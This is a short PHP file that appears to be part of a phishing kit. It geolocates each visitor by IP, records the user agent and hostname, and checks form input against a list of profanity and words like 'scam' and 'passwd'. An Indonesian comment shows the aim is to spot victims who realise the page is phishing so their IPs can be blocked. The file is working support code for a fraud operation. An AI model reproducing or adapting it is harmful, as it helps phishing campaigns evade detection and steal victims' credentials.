<?php
include(__DIR__.'/blacklists.php');
$v_ip = getenv("REMOTE_ADDR");
$ipDetails = json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $v_ip), true);
$systemInfo['city'] = $ipDetails['geoplugin_city'];
$systemInfo['region'] = $ipDetails['geoplugin_region'];
$systemInfo['country'] = $ipDetails['geoplugin_countryName'];
$systemInfo['code'] = $ipDetails['geoplugin_countryCode'];
$v_agent = $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
$warn = "A user (with ip: $v_ip - U AGENT $v_agent - HOSTNAME $hostname ) has attempted to send you a completed form containing abusive language.( ketahuan phising block ip ini ($v_ip) di blocker atau htacces)";
$warnsubj = "JohnLambong";
$bad_words = array('ass-fucker','addrs','asses','assfucker','b!tch','b00bs','b17ch','b1tch','bastard','bunny fucker','cyberfuc','cyberfuck ','cyberfucked ','cyberfucker','cyberfuckers','cyberfucking ','dog-fucker','fingerfuckers','fingerfucking ','fingerfucks ','fistfuck','fistfucked ','fistfucker ','fistfuckers ','fistfucking ','fistfuckings ','fistfucks ','flange','fook','fooker','fuck','fucka','fucked','fucker','fuckers','fuckhead','fuckheads','fuckin','fucking','fuckings','fuckingshitmotherfucker','fuckme ','fucks','fuckwhit','fuckwit','fudge packer','fudgepacker','fuker','fukker','fukkin','fux0r','f_u_c_k','mothafuck','mothafucka','mothafuckas','mothafuckaz','mothafucked ','mothafucker','mothafuckers','mothafuckin','mothafucking ','mothafuckings','mothafucks','mother fucker','motherfuck','motherfucked','motherfucker','motherfuckers','motherfuckin','motherfucking','motherfuckings','motherfuckka','motherfucks','muff','muthafecker','muthafuckker','muther','mutherfucker','pissing','pissoff ','porn','porno','pornography','pornos','titfuck','fuck','fuckoff','fuck off','fucking','scam','scammers','shit','asshole','arsehole','passwd','sample');
?>